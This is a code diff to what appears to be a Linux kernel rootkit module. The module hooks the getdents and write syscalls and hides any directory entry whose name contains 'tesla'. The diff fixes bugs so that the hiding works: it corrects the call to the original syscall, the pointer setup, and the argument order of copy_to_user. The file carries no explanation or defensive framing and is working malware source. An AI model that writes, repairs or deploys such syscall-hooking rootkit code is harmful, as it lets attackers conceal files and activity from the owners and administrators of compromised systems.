@@ -43,12 +43,11 @@ asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-	int ret, i;
-	ret = orig_dents(fd, dirp, count);
+	int ret = orig_getdents(fd, dirp, count);
     struct linux_dirent *p1 = kmalloc(ret, GFP_KERNEL);
-	struct linux_dirent *p2 = p1;
+	struct linux_dirent *p2 = 0;
 
-	i = 0;
+	int i = 0;
 
 	if (ret == 0) {
 		kfree(p1);
@@ -59,6 +58,8 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 		kfree(p1);
 		return -EACCES;
 	}
+
+	p2 = p1;
 	
 	while (i < ret && (p2->d_reclen != 0)) {
 		if (strstr(p2->d_name,"tesla")) {
@@ -71,7 +72,7 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 		}
 	}
 	
-	if(copy_to_user(p1, dirp, ret) != 0) {
+	if(copy_to_user(dirp, p1, ret) != 0) {
 		kfree(p1);
 		return -EACCES;
 	}
